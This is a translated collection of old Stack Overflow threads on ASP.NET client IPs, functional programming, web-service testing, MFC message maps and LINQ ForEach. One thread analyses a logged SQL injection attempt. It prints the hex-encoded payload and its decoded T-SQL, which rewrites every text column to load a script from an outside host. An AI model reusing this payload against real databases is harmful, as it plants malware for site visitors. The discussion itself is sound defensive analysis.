string forwardedFor = Request.ServerVariables["HTTP_X_FORWARDED_FOR"];

string ipStr = string.IsNullOrWhiteSpace(forwardedFor) 
                   ? Request.ServerVariables["REMOTE_ADDR"] 
                   : forwardedFor.Split(',').Select(s => s.Trim()).First(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T09:44:36.257

我假设您在 NAT/反向代理后面，所以我认为您必须使用：

```
Request.ServerVariables("REMOTE_ADDR") 
```

172.16.0.0/12 很可能是您的私有 LAN，其中 172.16.16.248 是您自己的地址，而 172.16.16.1 是您的路由器/代理的地址。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-07-03T13:42:27.497

Request.ServerVariables("REMOTE_ADDR") 不起作用。这个问题是因为你的服务器可能在某个代理之后。（或通过某个网络连接到互联网）或者你的路由器设置被设置为 NAT（网络地址转换）这种技术不会将 ip 传递给服务器。在这种情况下，您无法使用 Asp.net 获取 IP 地址，但是 Java 提供小程序使用它您可以在任何情况下获取 IP 地址。

（仅适用于 Netscape、Mozilla 和 Firefox，并且必须启用 Java）

```
<script language="javascript" type="text/javascript">   

if (navigator.appName.indexOf("Netscape") != -1){
ip = "" + java.net.InetAddress.getLocalHost().getHostAddress();
document.write("<b>Your IP address is " + ip+'</b>');
}
else {
document.write("<b>IP Address only shown in Netscape with Java enabled!</b>");
}

</script> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T10:10:57.203

您在此处列出的两个地址来自定义为私有的范围之一。（见[这里](http://en.wikipedia.org/wiki/Private_network)的描述）

听起来您更像是在获取您自己的防火墙的内部地址？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-08-02T19:42:57.567

基于 tomfannings 的回答...

```
 public static string ClientIp(this HttpRequestBase @this) {
  var clientIp = string.Empty;
  string forwardedFor = @this.ServerVariables["HTTP_X_FORWARDED_FOR"];

  if (string.IsNullOrWhiteSpace(forwardedFor)) {
    clientIp = @this.ServerVariables["REMOTE_ADDR"];
  } else {

    var array = forwardedFor
      .Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
      .Select(s => s.Trim());

    foreach (var element in array) {
      if (element.IsValidIp4() || element.IsValidIp6()) {
        clientIp = element;
        break;
      }
    }
  }
  return clientIp;
}

public static bool IsValidIp4(this string @this) {
  var pattern = new Regex(@"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))$");
  return pattern.IsMatch(@this);
}

public static bool IsValidIp6(this string @this) {
  var pattern = new Regex(@"^s*((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:)))(%.+)?s*(\/(d|dd|1[0-1]d|12[0-8]))$");
  return pattern.IsMatch(@this);
} 
```

# functional-programming - 函数式编程适合哪种类型的问题？

> ID：200530
> 
> 赞同：12
> 
> 时间：2008-10-14T09:40:03.413
> 
> 标签：functional-programming

函数式编程似乎是计算机科学中的一种范式，它的呼声越来越高。

我想知道使用函数式编程方法而不是更传统的面向对象方法可以更好地解决哪种问题。

谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-14T10:59:06.780

函数式编程最适合大多数类型的问题，包括您通常使用面向对象编程的任何问题，除了可能需要存储大量状态或其他副作用的问题。除此之外，FP 比 OOP 更优雅地处理复杂问题，因为其中很多来自数学背景（从 lambda 演算开始）。就抽象和组合而言，您拥有更大的灵活性。具有大量设计模式的面向对象程序可以使用更多功能结构进行重构，这将允许您在没有设计模式让您编写的样板结构的情况下做同样的事情。除了数学和解析之外，FP 还被广泛应用于人工智能（尤其是 Lisp）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-14T09:45:50.483

函数式编程非常适合创建可以并行执行的程序，因为它们不鼓励使用全局状态。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-14T10:36:28.557

这与这些其他问题很接近。

[为什么选择函数式语言？](https://stackoverflow.com/questions/36504/why-functional-languages)

[函数式编程有什么好处？](https://stackoverflow.com/questions/128057/what-are-the-benefits-of-functional-programming)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T09:46:15.193

函数式语言在数学和统计学中被大量使用。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T09:56:11.070

为了进一步了解并行执行点，函数式语言往往有利于图形建模，例如光线追踪。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-14T09:49:49.820

我同意Galwegian -

“函数式语言在数学和统计学中被大量使用。”

然而，这些并不是唯一的用途。随着函数式编程语言变得越来越主流，您可能会开始寻找用这些语言编写的业务类/库/软件。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-14T09:58:15.403

几乎任何有很多数学的东西。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-10-14T10:48:43.197

例如，函数式语言 ML 非常适合实现编译器和其他操作树的应用程序。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-14T10:00:01.907

如果您正在编写 C++ 模板，那么您就是在使用纯函数式语言。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-14T10:53:50.940

XSLT 是一种函数式编程语言的示例，用于对表示为 XML 的数据或文档进行转换 —— 诚然，这是一种非常冗长且非常有限的语言。如果我没记错的话，XQuery 也是纯粹的函数式。诀窍在于，在没有任何全局状态概念的情况下，它们只能在主机程序上提供数据并使用它们的结果。这有助于保持 XSLT 程序（样式表）的纯粹性和可重用性，但是您需要添加某种（命令式）框架以将它们用作通用处理系统的一部分。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-14T19:13:38.310

基本的电子表格可以看作是功能程序...... :)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-17T18:29:22.250

数据结构。示例：将 Fibonacci Heap（通常用作优先级队列）的命令式实现与函数式实现进行比较。功能代码通常少于 100 行代码，而命令式实现可以是更多代码行。

# java - Java Web服务测试

> ID：200535
> 
> 赞同：3
> 
> 时间：2008-10-14T09:41:47.700
> 
> 标签：java, web-services, testing

我为我的组织提供网络服务。我想知道是否有人会推荐使用 apache cactus 来设置测试框架，或者是否有人使用过任何其他可能有用的 Web 服务框架？

谢谢达米安

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T09:57:37.370

当您处理 Web 服务时，您不需要使用 Jakarta Cactus 并且可以编写普通的旧 JUnit 测试。

测试将采取两种形式：

**1\. 底层功能是否按预期工作？**

这与 Web 服务本身无关，而与它提供的底层功能无关。例如，您的数据访问对象是否正确检索/处理数据？希望您的 Web 服务接口和底层功能没有紧密耦合。

**2\. 实时 Web 服务（无论是 SOAP/REST/XMLRPC）是否正常运行？**

在这种情况下，一个很好的测试方法是构建一个 Web 服务客户端并编写测试以查看该客户端是否可以针对 Web 服务正常工作。例如，使用 Axis/CXF/XFire 构建 Web 服务客户端，然后为它返回的数据编写 JUnit 测试。

还要记住将您的测试针对此 Web 服务的最终用户将使用的内容。如果您编写了 Java Web 服务，但它正在被 .Net 客户端使用，那么请确保针对 .Net 客户端测试该服务。当涉及到一致的跨平台行为时，SOAP 服务尤其麻烦。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T09:58:03.297

[有一个名为 SoapUI ( http://www.soapui.org/](http://www.soapui.org/) )的开源应用程序。使用此应用程序，您可以 1) 手动测试 Web 服务或 2) 使用 groovy（类似 java 的脚本）语言进行功能测试。

它工作得很好，很多组织都在使用它。他们有一个开源版本以及一个商业（具有更多功能和支持）版本。看看这个。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-10T12:32:17.333

Apache 于 2011 年 8 月 5 日停用 Jakarta Cactus，因此不建议将其用于任何新项目。

# sql-server - 尝试过的 SQL 注入攻击——他们想做什么？

> ID：200545
> 
> 赞同：22
> 
> 时间：2008-10-14T09:44:09.347
> 
> 标签：sql-server, sql-injection

我有一个面向公众的网站，在过去几周内收到了许多 SQL 注入攻击。我专门使用参数化存储过程，所以我相信没有*成功*的攻击，但最近的日志显示了一个有趣的技术：

*为了清楚起见，添加了换行符*

```
http://www.mydummysite.uk/mypage.asp?l_surname=Z;DECLARE%20@S%20CHAR(4000);SET
@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263
686172283430303029204445434C415245205461626C655F437572736F7220435552534F
5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F
626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E69
6420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F72
20622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970
653D31363729204F50454E205461626C655F437572736F72204645544348204E45585420
46524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528
404046455443485F5354415455533D302920424547494E20657865632827757064617465
205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C
736372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F6373
7273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D2077
6865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C73
6372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F637372
73732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E455854
2046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E442043
4C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F43
7572736F72 AS CHAR(4000));EXEC(@S);&_X="

```

谁能阐明“CAST and EXEC”试图做什么？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-14T09:45:46.380

下面是他们试图推送的解码 SQL：

```
DECLARE @T varchar(255),
        @C varchar(4000) 

DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name
FROM sysobjects a,syscolumns b 
WHERE a.id=b.id 
AND a.xtype='u' 
AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 

OPEN Table_Cursor FETCH NEXT 
FROM Table_Cursor INTO @T,@C 
WHILE(@@FETCH_STATUS=0) 
  BEGIN exec('update ['+@T+'] SET ['+@C+']=''"></title><script src="http://www2.s800qn.cn/csrss/w.js"></script><!--''+['+@C+'] WHERE '+@C+' NOT like ''%"></title><script src="http://www2.s800qn.cn/csrss/w.js"></script><!--''')
  FETCH NEXT FROM  Table_Cursor INTO @T,@C 
END CLOSE Table_Cursor 

DEALLOCATE Table_Cursor 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-10-14T09:48:49.900

该代码从十六进制解密为字​​符时，似乎会遍历所有数据库表，选择所有 text/char 类型的列，并在此类型的每个值的末尾添加一个恶意脚本执行来自`http://www2.s800qn.cn/csrss/w.js`. 现在，如果在您的网站中，您至少有一个地方不会对从数据库中检索到的文本数据进行转义，那么您网站的用户将在他们的机器上执行此恶意脚本。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-14T09:51:42.983

运行这个，例如在 mysql 中：

```
select CAST(0x44...72 AS CHAR(4000)) as a; 
```

你会知道的。Ishmaeel 粘贴了代码。

这是一个 SQLserver 蠕虫，而不是针对 atatck。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-14T09:49:17.810

我想我们以前有过这种攻击。它试图`<script>`在数据库中每个表的每个字段中插入一个标签。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T09:55:15.503

`<script>`这是一个广告软件投放脚本，旨在用显示在您页面上的标签来堵塞您的数据库。它已被编码，因为如果您尝试通过 URL 推送该垃圾，大多数服务器会爆炸。

像这样的大多数事情都是随机尝试攻击，因为它们会用查询字符串攻击任何东西，但它可能是有针对性的攻击。测试您的站点以确保它不会让来自查询字符串的任何 SQL 执行。仅使用参数化查询*应该*涵盖您。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T09:50:10.367

解密十六进制代码的最简单的 Python 算法是：

```
text = "4445434C415245204054207661726368617228323535292C404..."

def getText():
    for i in range(0, len(text), 2):
        byte = text[i:i+2]
        char = int(byte, 16)
        toPrint = chr(char)
        yield toPrint

print ''.join(getText()) 
```

# c++ - 在 MFC 中捕获消息 - 有什么区别？

> ID：200550
> 
> 赞同：5
> 
> 时间：2008-10-14T09:46:01.857
> 
> 标签：c++, windows, mfc, messages

我只是想知道 MFC 中以下两个用于函数 OnSize(..) 的消息陷阱之间的区别是什么（如果有的话）。

# 1 - 通过消息映射：

```
BEGIN_MESSAGE_MAP(CClassWnd, CBaseClassWnd)
...
    ON_WM_SIZE()
..
END_MESSAGE_MAP() 
```

# 2 - 通过 afx_message：

```
afx_msg type OnSize(...); 
```

它们似乎可以互换使用，应该使用哪一个还是取决于其他因素？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-14T10:22:48.630

这两个部分都是向类添加消息处理程序所必需的。消息映射应与任何消息处理函数（例如`OnSize`）的声明一起在您的类中声明。

```
class CClassWnd : public CBaseClassWnd {
    ...
    afx_msg void OnSize(UINT nType, int cx, int cy);
    DECLARE_MESSAGE_MAP
}; 
```

`afx_msg`只是一个空的占位符宏 - 它实际上并没有做任何事情，但总是按照惯例包含在内。

然后在类的 .cpp 文件中定义消息映射：

```
BEGIN_MESSAGE_MAP(CClassWnd, CBaseClassWnd)
    ON_WM_SIZE()
END_MESSAGE_MAP() 
```

这些宏为类生成一个查找表，允许将窗口接收到的消息分派到相应的处理函数。该`ON_WM_SIZE`宏允许将消息中的`wParam`和`lParam`message 参数`WM_SIZE`解码为对消息处理函数更有意义的值（在本例中为`nType`,`cx`和`cy`）。MFC 为大多数窗口消息（、、等）提供`WM_LBUTTONDOWN`宏`WM_DESTROY`。

[您可以在](http://msdn.microsoft.com/en-us/library/0x0cx6b1.aspx)MSDN上找到有关消息映射如何在 MFC 中工作的更多信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T09:54:17.313

afx_msg 只是一个空宏，它基本上只是为了表示该方法是一个 MFC 消息处理程序，以提高可读性。即使有 afx_msg ，您仍然需要在消息映射中有一个条目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-15T03:51:00.853

某些 Windows 消息已由**MFC**处理，因此在这些情况下，您可以只将方法添加到派生类中。

例如，**CWnd**类（与许多其他 MFC 类一样）已经将一些 Windows 消息映射到它的消息映射中（即*ON_WM_DRAWITEM*、*ON_WM_MEASUREITEM*、*ON_WM_ENTERIDLE*等）。

但是任何其他尚未被 MFC 映射的消息都需要在消息映射中同时具有类方法和条目才能工作。

# linq - LINQ 等效于 IEnumerable 的 foreach

> ID：200574
> 
> 赞同：807
> 
> 时间：2008-10-14T09:56:09.790
> 
> 标签：linq, foreach, ienumerable

我想在 LINQ 中执行以下等效操作，但我不知道如何：

```
IEnumerable<Item> items = GetItems();
items.ForEach(i => i.DoStuff()); 
```

真正的语法是什么？

* * *

## 回答 #1

> 赞同：977
> 
> 时间：2008-10-14T10:00:08.020

没有 ForEach 扩展`IEnumerable`；只为`List<T>`。所以你可以做

```
items.ToList().ForEach(i => i.DoStuff()); 
```

或者，编写您自己的 ForEach 扩展方法：

```
public static void ForEach<T>(this IEnumerable<T> enumeration, Action<T> action)
{
    foreach(T item in enumeration)
    {
        action(item);
    }
} 
```

* * *

## 回答 #2

> 赞同：400
> 
> 时间：2008-10-14T10:10:51.133

Fredrik 提供了修复程序，但可能值得考虑为什么这不在框架中。我相信这个想法是 LINQ 查询运算符应该是无副作用的，适合以合理的功能看待世界的方式。显然 ForEach 正好相反——一个*纯粹*基于副作用的构造。

这并不是说这是一件坏事——只是想想这个决定背后的哲学原因。

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2011-09-01T19:24:34.737

**2012 年 7 月 17 日更新**：显然从 C# 5.0 开始，`foreach`下面描述的行为已经改变，“在嵌套 lambda 表达式中[使用`foreach`迭代变量不再产生意外结果。](http://msdn.microsoft.com/en-us/library/hh678682%28v=vs.110%29.aspx) ”这个答案不适用于 C# ≥ 5.0 .

@John Skeet 和喜欢 foreach 关键字的每个人。

**[在 5.0 之前](http://msdn.microsoft.com/en-us/library/hh678682%28v=vs.110%29.aspx)**的 C# 中，“foreach”的问题在于，它与其他语言中等效的“用于理解”的工作方式以及我期望它的工作方式不一致（个人观点仅在此处陈述，因为其他人提到了他们的关于可读性的意见）。请参阅有关“[访问修改后的闭包](https://stackoverflow.com/search?q=modified%20closure&submit=search)”以及“[关闭被认为有害的循环变量](http://blogs.msdn.com/b/ericlippert/archive/2009/11/12/closing-over-the-loop-variable-considered-harmful.aspx)”的所有问题。这只是“有害的”，因为“foreach”是在 C# 中实现的。

使用与@Fredrik Kalseth 的答案中的功能等效的扩展方法来获取以下示例。

```
public static class Enumerables
{
    public static void ForEach<T>(this IEnumerable<T> @this, Action<T> action)
    {
        foreach (T item in @this)
        {
            action(item);
        }
    }
} 
```

为过度做作的例子道歉。我只使用 Observable 是因为做这样的事情并不完全牵强。显然有更好的方法来创建这个 observable，我只是试图证明一个观点。通常，订阅 observable 的代码是异步执行的，并且可能在另一个线程中执行。如果使用“foreach”，这可能会产生非常奇怪且可能不确定的结果。

以下使用“ForEach”扩展方法的测试通过：

```
[Test]
public void ForEachExtensionWin()
{
    //Yes, I know there is an Observable.Range.
    var values = Enumerable.Range(0, 10);

    var observable = Observable.Create<Func<int>>(source =>
                            {
                                values.ForEach(value => 
                                    source.OnNext(() => value));

                                source.OnCompleted();
                                return () => { };
                            });

    //Simulate subscribing and evaluating Funcs
    var evaluatedObservable = observable.ToEnumerable().Select(func => func()).ToList();

    //Win
    Assert.That(evaluatedObservable, 
        Is.EquivalentTo(values.ToList()));
} 
```

以下失败并出现错误：

*预期：相当于 < 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 > 但为： < 9, 9, 9, 9, 9, 9, 9, 9, 9, 9 >*

```
[Test]
public void ForEachKeywordFail()
{
    //Yes, I know there is an Observable.Range.
    var values = Enumerable.Range(0, 10);

    var observable = Observable.Create<Func<int>>(source =>
                            {
                                foreach (var value in values)
                                {
                                    //If you have resharper, notice the warning
                                    source.OnNext(() => value);
                                }
                                source.OnCompleted();
                                return () => { };
                            });

    //Simulate subscribing and evaluating Funcs
    var evaluatedObservable = observable.ToEnumerable().Select(func => func()).ToList();

    //Fail
    Assert.That(evaluatedObservable, 
        Is.EquivalentTo(values.ToList()));
} 
```

* * *

## 回答 #4

> 赞同：39
> 
> 时间：2010-10-05T14:16:03.957

您可以使用`FirstOrDefault()`可用于`IEnumerable<T>`. 通过`false`从谓词返回，它将为每个元素运行，但不会关心它实际上没有找到匹配项。这将避免`ToList()`开销。

```
IEnumerable<Item> items = GetItems();
items.FirstOrDefault(i => { i.DoStuff(); return false; }); 
```

* * *

## 回答 #5

> 赞同：25
> 
> 时间：2012-12-26T22:56:41.957

## 让你的副作用远离我的 IEnumerable

> > 我想在 LINQ 中执行以下等效操作，但我不知道如何：

[正如其他人在](https://stackoverflow.com/a/200614/184528)国内外指出的那样，LINQ 和`IEnumerable`方法预计不会产生副作用。

您真的想对 IEnumerable 中的每个项目“做点什么”吗？那么`foreach`是最好的选择。当副作用发生在这里时，人们并不感到惊讶。

```
foreach (var i in items) i.DoStuff(); 
```

## 我打赌你不想要副作用

然而，根据我的经验，通常不需要副作用。通常有一个简单的 LINQ 查询等待被发现，并附有由 Jon Skeet、Eric Lippert 或 Marc Gravell 提供的 StackOverflow.com 答案，解释如何做你想做的事！

## 一些例子

如果您实际上只是聚合（累积）一些值，那么您应该考虑`Aggregate`扩展方法。

```
items.Aggregate(initial, (acc, x) => ComputeAccumulatedValue(acc, x)); 
```

也许您想`IEnumerable`从现有值创建一个新值。

```
items.Select(x => Transform(x)); 
```

或者，也许您想创建一个查找表：

```
items.ToLookup(x, x => GetTheKey(x)) 
```

可能性的列表（双关语并非完全有意）还在继续。

* * *

## 回答 #6

> 赞同：24
> 
> 时间：2010-06-02T08:54:41.347

我采用了 Fredrik 的方法并修改了返回类型。

这样，该方法像其他 LINQ 方法一样支持*延迟执行。*

**编辑：**如果不清楚，则此方法的任何使用都**必须以 ToList()**或任何其他方式结束，以强制该方法在完整的可枚举上工作。否则，该动作将不会被执行！

```
public static IEnumerable<T> ForEach<T>(this IEnumerable<T> enumeration, Action<T> action)
{
    foreach (T item in enumeration)
    {
        action(item);
        yield return item;
    }
} 
```

这是帮助查看它的测试：

```
[Test]
public void TestDefferedExecutionOfIEnumerableForEach()
{
    IEnumerable<char> enumerable = new[] {'a', 'b', 'c'};

    var sb = new StringBuilder();

    enumerable
        .ForEach(c => sb.Append("1"))
        .ForEach(c => sb.Append("2"))
        .ToList();

    Assert.That(sb.ToString(), Is.EqualTo("121212"));
} 
```

如果最后删除**ToList()**，您将看到测试失败，因为 StringBuilder 包含一个空字符串。这是因为没有方法强制 ForEach 枚举。

* * *

## 回答 #7

> 赞同：18
> 
> 时间：2015-07-31T16:04:53.210

如果您想充当枚举卷，您应该让出**每个**项目。

```
public static class EnumerableExtensions
{
    public static IEnumerable<T> ForEach<T>(this IEnumerable<T> enumeration, Action<T> action)
    {
        foreach (var item in enumeration)
        {
            action(item);
            yield return item;
        }
    }
} 
```

* * *

## 回答 #8

> 赞同：17
> 
> 时间：2020-06-30T17:42:42.760

这么多的答案，但都未能指出自定义*通用* `ForEach`扩展的一个非常重要的问题：**性能！**更具体地说，**内存使用**和**GC**。

考虑下面的示例。目标是`.NET Framework 4.7.2`或`.NET Core 3.1.401`，配置是`Release`和平台是`Any CPU`。

```
public static class Enumerables
{
    public static void ForEach<T>(this IEnumerable<T> @this, Action<T> action)
    {
        foreach (T item in @this)
        {
            action(item);
        }
    }
}

class Program
{
    private static void NoOp(int value) {}

    static void Main(string[] args)
    {
        var list = Enumerable.Range(0, 10).ToList();
        for (int i = 0; i < 1000000; i++)
        {
            // WithLinq(list);
            // WithoutLinqNoGood(list);
            WithoutLinq(list);
        }
    }

    private static void WithoutLinq(List<int> list)
    {
        foreach (var item in list)
        {
            NoOp(item);
        }
    }

    private static void WithLinq(IEnumerable<int> list) => list.ForEach(NoOp);

    private static void WithoutLinqNoGood(IEnumerable<int> enumerable)
    {
        foreach (var item in enumerable)
        {
            NoOp(item);
        }
    }
} 
```

乍一看，所有三个变体都应该表现同样出色。但是，当`ForEach`扩展方法被多次调用时，*最终*会产生垃圾，这意味着代价高昂的 GC。事实上，`ForEach`在热路径上使用这种扩展方法已被证明会完全破坏我们循环密集型应用程序的性能。

类似地，弱类型`foreach`循环也会产生垃圾，但它仍然会比`ForEach`扩展更快且内存占用更少（它也受到[委托分配](https://devblogs.microsoft.com/pfxteam/know-thine-implicit-allocations/)的影响）。

## 强类型foreach：内存使用

[![没有分配。 没有 GC](https://i.stack.imgur.com/OanUT.png)](https://i.stack.imgur.com/OanUT.png)

## 弱类型的foreach：内存使用

[![在此处输入图像描述](https://i.stack.imgur.com/7lyz0.png)](https://i.stack.imgur.com/7lyz0.png)

## ForEach 扩展：内存使用

[![大量分配。 重 GC。](https://i.stack.imgur.com/OUwSP.png)](https://i.stack.imgur.com/OUwSP.png)

## 分析

对于强类型`foreach`，编译器能够使用类的任何优化枚举器（例如基于值的），而泛型`ForEach`扩展必须回退到将在每次运行时分配的泛型枚举器。此外，实际代表也将意味着额外的分配。

使用该方法您会得到类似的不良结果`WithoutLinqNoGood`。在那里，参数是类型`IEnumerable<int>`而不是`List<int>`暗示相同类型的枚举器分配。

以下是`IL`. 基于值的枚举器当然更可取！

```
IL_0001:  callvirt   instance class
          [mscorlib]System.Collections.Generic.IEnumerator`1<!0> 
          class [mscorlib]System.Collections.Generic.IEnumerable`1<!!T>::GetEnumerator() 
```

**对比**

```
IL_0001:  callvirt   instance valuetype
          [mscorlib]System.Collections.Generic.List`1/Enumerator<!0>
          class [mscorlib]System.Collections.Generic.List`1<int32>::GetEnumerator() 
```

## 结论

OP 询问如何`ForEach()`调用`IEnumerable<T>`. 原始答案清楚地表明了如何做到这*一点*。当然你可以做到，但又一次；我的回答清楚地表明你不应该。

验证目标时的相同行为`.NET Core 3.1.401`（使用 编译`Visual Studio 16.7.2`）。

* * *

## 回答 #9

> 赞同：11
> 
> 时间：2011-08-15T15:49:01.047

Microsoft 有一个[交互式扩展 LINQ](http://www.microsoft.com/download/en/details.aspx?id=26651)的实验版本（也在[NuGet 上](https://www.nuget.org/packages/Ix-Main/)，有关更多链接，请参阅[RxTeams 的配置文件](https://www.nuget.org/profiles/rxteam)）。第[9 频道的视频](http://channel9.msdn.com/Shows/Going+Deep/Bart-De-Smet-Interactive-Extensions-Ix)很好地解释了这一点。

它的文档仅以 XML 格式提供。我已[在 Sandcastle 中运行此文档，](http://files.me.com/jwigger/cwysjb)以使其具有更易读的格式。解压缩文档存档并查找*index.html*。

在许多其他好处中，它提供了预期的 ForEach 实现。它允许您编写如下代码：

```
int[] numbers = { 1, 2, 3, 4, 5, 6, 7, 8 };

numbers.ForEach(x => Console.WriteLine(x*x)); 
```

* * *

## 回答 #10

> 赞同：8
> 
> 时间：2015-10-24T21:24:11.087

根据 PLINQ（自 .Net 4.0 起可用），您可以执行

```
IEnumerable<T>.AsParallel().ForAll() 
```

在 IEnumerable 上执行并行 foreach 循环。

* * *

## 回答 #11

> 赞同：6
> 
> 时间：2010-08-31T06:43:49.177

ForEach 的目的是引起副作用。IEnumerable 用于集合的惰性枚举。

当您考虑它时，这种概念差异是非常明显的。

`SomeEnumerable.ForEach(item=>DataStore.Synchronize(item));`

在您执行“计数”或“ToList（）”或其他操作之前，这不会执行。这显然不是所表达的。

您应该使用 IEnumerable 扩展来设置迭代链，通过它们各自的来源和条件定义内容。表达式树功能强大且高效，但您应该学会欣赏它们的本质。不仅仅是为了围绕它们进行编程以保存一些覆盖惰性求值的字符。

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2012-07-08T22:47:32.407

很多人提到它，但我不得不写下来。这不是最清晰/最易读的吗？

```
IEnumerable<Item> items = GetItems();
foreach (var item in items) item.DoStuff(); 
```

简短而简单（st）。

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2011-06-02T15:16:13.890

现在我们可以选择...

```
 ParallelOptions parallelOptions = new ParallelOptions();
        parallelOptions.MaxDegreeOfParallelism = 4;
#if DEBUG
        parallelOptions.MaxDegreeOfParallelism = 1;
#endif
        Parallel.ForEach(bookIdList, parallelOptions, bookID => UpdateStockCount(bookID)); 
```

当然，这开辟了一个全新的线虫罐头。

ps（抱歉字体，这是系统决定的）

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2014-01-05T20:27:29.637

正如许多答案已经指出的那样，您可以自己轻松地添加这样的扩展方法。但是，如果您不想这样做，尽管我在 BCL 中不知道有这样的事情，但`System`如果您已经有对[Reactive Extension](https://www.nuget.org/packages/Rx-Main)的引用（并且如果您没有， 你应该有）：

```
using System.Reactive.Linq;

items.ToObservable().Subscribe(i => i.DoStuff()); 
```

尽管方法名称有些不同，但最终结果正是您要寻找的。

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2015-02-23T21:30:59.587

ForEach 也可以是**Chained**，只是在动作之后放回 pileline 。**保持流利**

* * *

```
Employees.ForEach(e=>e.Act_A)
         .ForEach(e=>e.Act_B)
         .ForEach(e=>e.Act_C);

Orders  //just for demo
    .ForEach(o=> o.EmailBuyer() )
    .ForEach(o=> o.ProcessBilling() )
    .ForEach(o=> o.ProcessShipping());

//conditional
Employees
    .ForEach(e=> {  if(e.Salary<1000) e.Raise(0.10);})
    .ForEach(e=> {  if(e.Age   >70  ) e.Retire();}); 
```

* * *

一个**Eager**版本的实现。

```
public static IEnumerable<T> ForEach<T>(this IEnumerable<T> enu, Action<T> action)
{
    foreach (T item in enu) action(item);
    return enu; // make action Chainable/Fluent
} 
```

**编辑：**一个**懒惰**的版本正在使用产量回报，就像[这样](https://stackoverflow.com/a/31750549/2055187)。

```
public static IEnumerable<T> ForEachLazy<T>(this IEnumerable<T> enu, Action<T> action)
{
    foreach (var item in enu)
    {
        action(item);
        yield return item;
    }
} 
```

